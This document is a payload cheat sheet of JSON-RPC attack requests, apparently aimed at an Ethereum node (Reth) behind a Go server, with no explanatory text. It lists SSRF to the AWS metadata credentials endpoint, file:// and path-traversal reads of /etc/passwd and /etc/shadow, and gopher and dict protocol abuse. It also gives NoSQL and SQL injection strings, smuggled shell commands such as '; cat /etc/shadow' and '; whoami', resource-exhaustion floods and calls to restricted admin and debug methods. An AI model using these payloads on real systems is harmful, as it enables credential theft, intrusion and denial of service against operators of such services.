**AWS Metadata Access**
```json
{"jsonrpc":"2.0","method":"fetchUrl","params":{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"},"id":1}
```
**Local File Inclusion (LFI)**
```json
{"jsonrpc":"2.0","method":"fetchUrl","params":{"url":"file:///etc/passwd"},"id":1}
```
**Gopher Protocol Exploitation**
```json
{"jsonrpc":"2.0","method":"fetchUrl","params":{"url":"gopher://127.1:80/_<gopher-payload>"},"id":1}
```
**Dict Protocol Abuse**
```json
{"jsonrpc":"2.0","method":"fetchUrl","params":{"url":"dict://example.com:11111/d:word:database:1"},"id":1}
```
**Hex-Encoded Localhost**
```json
{"jsonrpc":"2.0","method":"fetchUrl","params":{"url":"http://0x7f000001"},"id":1}
```
**IPv6 Localhost Access**
```json
{"jsonrpc":"2.0","method":"fetchUrl","params":{"url":"http://[::1]"},"id":1}
```
**Duplicate Key Exploit**
```json
{"username":"admin","isAdmin":false,"isAdmin":true}
```
**NoSQL Injection**
```json
{"filter":{"age":{"$ne":null}}}
```
**JSON Injection/XSS**
```json
{"email":"test@example.com\",\"alert(1)//\":\""}
```
**JSON Parameter Pollution**
```json
POST /api?data={"foo":1}...
```
**SQL Injection Attempt**
```json
{"filters":["1=1 --"]}
```
**Ethereum Chain ID Probe**
```json
{"method":"eth_chainId","params":[],"id":1}
```
**JSON-RPC Version Downgrade**
```json
{"jsonrpc":"1.0","method":"foo","params":[],"id":1}
```
**Null Bomb**
```json
{"jsonrpc":null,"method":null,"params":null,"id":null}
```
**Batch Request Flood**
```json
[{"jsonrpc":"2.0","method":"foo","params":[],"id":1}]
```
**Unexpected Parameter Test**
```json
{"jsonrpc":"2.0","foo":"bar"}
```
**Deeply Nested Object**
```json
{"a":{"b":{"c":{...}}}
```
**Large Array DoS**
```json
{"arr":[0,1,2,…,99999]}
```
**Infinity Value Crash**
```json
{"value":9e9999}
```
**Oversized String Payload**
```json
{"str":"AAAA…(10MB)…AAAA"}
```
**Circular Reference Attack**
```json
{"$ref":"$"}
```
**AWS Metadata Root Access**
```json
{"jsonrpc":"2.0","method":"fetchUrl","params":{"url":"http://169.254.169.254/"},"id":1}
```
**Deep Object Nesting**
```json
{"jsonrpc":"2.0","method":"echo","params":{"data":{"a":{"b":{"c":{"d":{"e":{}}}}}}},"id":2}
```
**Type Confusion (Array/Object)**
```json
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": {"number":"latest"}, "id": 1 }
```
**Deep Array Nesting**
```json
{"jsonrpc": "2.0", "method": "eth_getLogs", "params":[[[[deep]]]], "id": 1}
```
**Null Parameter Handling**
```json
{"jsonrpc": "2.0", "method":"eth_getBlockByNumber", "params": [null,null], "id": 1 }
```
**Missing Parameters**
```json
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "id": 1 }
```
**Type Confusion**
```json
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": [12345, false], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": {"number":"latest"}, "id": 1 }
```
**Deep Nesting**
```json
{"jsonrpc": "2.0", "method": "eth_getLogs", "params":[[[[deep]]]], "id": 1}
```
**Nulls & Missing Params**
```json
{"jsonrpc": "2.0", "method":"eth_getBlockByNumber", "params": [null,null], "id": 1 }
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "id": 1 }
```
**DoS payload**
- Huge Strings
```json
{"jsonrpc": "2.0", "method": "eth_getLogs", "params": ["0x" + "f".repeat(1_000_000)], "id": 1}
- Large Ranges
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": [{"fromBlock": "0x0", "toBlock": "0xFFFFFF"}], "id": 1}
```
**Bombing the server**
- Spam
```json
{ "jsonrpc": "2.0", "method": "non_existing_method", "params": [], "id": 1337}
```
**Method Abuse Payloads**
- Calling sensetive/restricted methods
```json
{ "jsonrpc": "2.0", "method": "admin_peers", "params": [], "id": 3}
{ "jsonrpc": "2.0", "method": "admin_addPeer", "params": ["enode://..."], "id": 1}
{ "jsonrpc": "2.0", "method": "admin_removePeer", "params": ["enode://..."], "id": 1}
{ "jsonrpc": "2.0", "method": "admin_setSolc", "params": ["0.8.0"], "id": 1}
{ "jsonrpc": "2.0", "method": "debug_traceTransaction", "params": ["0x123..."], "id": 1}
{ "jsonrpc": "2.0", "method": "net_listening", "params": [], "id": 1}
```
**Unexpected JSON-RPC Behavior**
- Batch Requests
```json
[{ "jsonrpc": "2.0", "method": "eth_blockNumber", "id": 1} , {"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["latest",false], "id": 2}]
```
- Empty batch []
```json
[{}, {}, {}, {}, {}, {}, {}, {}, {}, {}]
```
- Overload batch (e.g 1000 requests)
```json
[{ "jsonrpc": "2.0", "method": "eth_blockNumber", "id": 1} , {"jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["latest",false], "id": 2}, ... ]
```
- Invalid ID Types
```json
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1.1}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1.0}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": -1}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": 1e10}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": {}}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": []}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": true}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": false}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": null}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": undefined}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": NaN}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": Infinity}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": -Infinity}
{ "jsonrpc": "2.0", "method": "eth_blockNumber", "params": [], "id": {"custom": "object"}}
```
**Input Fuzzing (Deserialization / Type Confusion in Go)**
- Trigger Go deserialization errors (panic , unhandled exceptions, or misbehavior in Reth)
```json
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": [1234, 1234], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": [null, 1234], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": [null, null], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": [null,null], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["\n\n\n", 1234], "id": 1}
```
**Priority & Nonce Manipulation**
```json
{ "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": "0x123...", "to": "0x456...", "value": "0x1", "gasPrice": "0x10000000000", "nonce": 1}], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": "0x123...", "to": "0x456...", "value": "0x1", "gasPrice": null, "nonce": 1}], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": null, "to": null, "value": null, "gasPrice": null, "nonce": null}], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": "0x123...", "to": "0x456...", "value": "0x1", "gasPrice": 0, "nonce": 1}], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": null, "to": null, "value": null, "gasPrice": 0, "nonce": null}], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": null, "to": null, "value": null, "gasPrice": null, "nonce": 1}], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": null, "to": null, "value": null, "gasPrice": 0, "nonce": 1}], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": null, "to": null, "value": null, "gasPrice": 0, "nonce": null}], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": null, "to": null, "value": null, "gasPrice": 0, "nonce": 1}], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_sendTransaction", "params": [{"from": null, "to": null, "value": null, "gasPrice": 0, "nonce": null}], "id": 1}
```
**Privilege Escalation**
```json
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["latest", true], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": [null, null], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": [null, true], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": [null, false], "id": 1}
```
**Priority Attack Vectors + Payloads**
- Try these unauthorized method calls to reth via the Go server
```json
{ "jsonrpc": "2.0", "method": "debug_traceTransaction", "params": ["0xdeadbeef..."], "id": 1}
{ "jsonrpc": "2.0", "method": "debug_traceBlockByNumber", "params": ["0xdeadbeef..."], "id": 1}
{ "jsonrpc": "2.0", "method": "debug_traceCall", "params": ["0xdeadbeef...", {"from": null, "to": null, "value": null}], "id": 1}
{ "jsonrpc": "2.0", "method": "debug_traceTransaction", "params": ["0xdeadbeef..."], "id": 1}
{ "jsonrpc": "2.0", "method": "debug_traceBlockByNumber", "params": ["0xdeadbeef..."], "id": 1}
{ "jsonrpc": "2.0", "method": "debug_traceCall", "params": ["0xdeadbeef...", {"from": "0x123...", "to": "0x456...", "value": "0x1"}], "id": 1}
{ "jsonrpc": "2.0", "method": "debug_traceTransaction", "params": ["0xdeadbeef...", {"from": null, "to": null, "value": null}], "id": 1}
{ "jsonrpc": "2.0", "method": "debug_traceBlockByNumber", "params": ["0xdeadbeef...", {"from": null, "to": null, "value": null}], "id": 1}
{ "jsonrpc": "2.0", "method": "debug_traceCall", "params": ["0xdeadbeef...", {"from": null, "to": null, "value": null}], "id": 1}
{ "jsonrpc": "2.0", "method": "admin_addPeer", "params": ["enode://..."], "id": 1}
{ "jsonrpc": "2.0", "method": "engine_getPayloadV1", "params": ["0xabc"], "id": 3}
```
**Protocol Bypass / Unicode Attacks**
```json
{ "jsonrpc": "2.0", "method": "eth_getBlockByNumber", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "\u0065\u0074\u0068\u005f\u0067\u0065\u0074\u0042\u006c\u006f\u0063\u006b\u0042\u0079\u004e\u0075\u006d\u0062\u0065\u0072", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "\u0065\u0074\u0068\u005f\u0067\u0065\u0074\u0042\u006c\u006f\u0063\u006b", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "\u0065\u0074\u0068\u005f\u0067\u0065\u0074\u0042\u006c\u006f\u0063\u006b", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "\u0065\u0074\u0068\u005f\u0067\u0065\u0074", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "\u0065\u0074\u0068", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "\u65e5\u672c", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "\u65e5", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "\u65e5", "params": ["latest", false], "id": 1}
```
- U+200B zero-width space in method name
```json
{ "jsonrpc": "2.0", "method": "eth\u200b_getBlockByNumber", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "eth\u200b_getBlockByNumber", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "eth\u200b_getBlockByNumber", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "\u200b\u0065\u0074\u0068\u005f\u0067\u0065\u0074\u0042\u006c\u006f\u0063\u006b", "params": ["latest", false], "id": 1}
{ "jsonrpc": "2.0", "method": "Eth_GetBlockByNumber", "params": ["latest",false], "id": 1}
```
- DoS Payloads (Resource Exhaustion)
```json
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": [{"fromBlock": "0x0", "toBlock": "latest"}], "id": 9}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": [["nested", ["data", ["a", ["b"]]]]], "id": 10}
```
**Linux Server Bugs (File Access/Injection)**
```json
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/passwd"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/shadow"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/hosts"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/hostname"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/resolv.conf"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/services"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/passwd%00"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/shadow%00"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/hosts%00"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/hostname%00"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/resolv.conf%00"], "id": 1}
{ "jsonrpc": "2.0", "method": "eth_getLogs", "params": ["file:///etc/services%00"],"id": 1}
{ "jsonrpc": "2.0", "method": "readFile", "params": ["../../../../../etc/passwd"], "id": 11}
```
- Command execution
```json
{ "jsonrpc": "2.0", "method": "exec", "params": ["ls -la"], "id": 1}
{ "jsonrpc": "2.0", "method": "exec", "params": ["cat /etc/passwd"], "id": 1}
{ "jsonrpc": "2.0", "method": "exec", "params": ["cat /etc/shadow"], "id": 1}
{ "jsonrpc": "2.0", "method": "exec", "params": ["cat /etc/hosts"], "id": 1}
{ "jsonrpc": "2.0", "method": "exec", "params": ["cat /etc/hostname"],"id": 1}
{ "jsonrpc": "2.0", "method": "exec", "params": ["cat /etc/resolv.conf"],"id": 1}
{ "jsonrpc": "2.0", "method": "exec", "params": ["cat /etc/services"],"id": 1}
{ "jsonrpc": "2.0", "method": "execute", "params": ["; cat /etc/shadow"], "id": 12}
{ "jsonrpc": "2.0", "method": "exec", "params": ["; cat /etc/shadow"], "id": 12}
```
**Whitespace Attacks**
```json
{ "jsonrpc": "2.0", "method": " ", "params": [], "id": 1}
{ "jsonrpc": "2.0", "method": "\t", "params": [], "id": 1}
{ "jsonrpc": "2.0", "method": "\n", "params": [], "id": 1}
{ "jsonrpc": "2.0", "method": "\r", "params": [], "id": 1}
{ "jsonrpc": "2.0", "method": "\f", "params": [], "id": 1}
{ "jsonrpc": "2.0", "method": "\v", "params": [], "id": 1}
{ "jsonrpc": "2.0", "method": "\b", "params": [], "id": 1}
{ "jsonrpc": "2.0", "method": "\t\n\r\f\v\b ", "params": [], "id": 1}
{ "jsonrpc": "2.0", "method": "\t\n\r\f\v\b \t\n\r\f\v\b ", "params": [], "id": 1}
{ "jsonrpc": "2.0", "method": "\t\n\r\f\v\b \t\n\r\f\v\b \t\n\r\f\v\b ", "params": [], "id": 1}
```
- Around method key
```json
{ "jsonrpc": "2.0", "method"     : "eth_blockNumber", "params": [], "id": 1}
```
- Inside method name
```json
{ "jsonrpc": "2.0", "method":        "eth_blockNumber", "params": [], "id": 13}
```
- Unicode whitespace
```json
{ "jsonrpc": "2.0", "method": "eth\u200B_BlockByNumber", "params": [], "id": 99}
{ "jsonrpc": "2.0", "method": "eth\u00A0Logs", "params": [], "id": 100}
```
> whitespace in params  
> useful if server process user input for storage/logs/sytems
```json
{ "jsonrpc": "2.0", "method": "customMethod", "params": ["; ls ~"], "id": 55}
{ "jsonrpc": "2.0", "method": "customMethod", "params": ["\t\n \r; whoami"], "id": 56}
```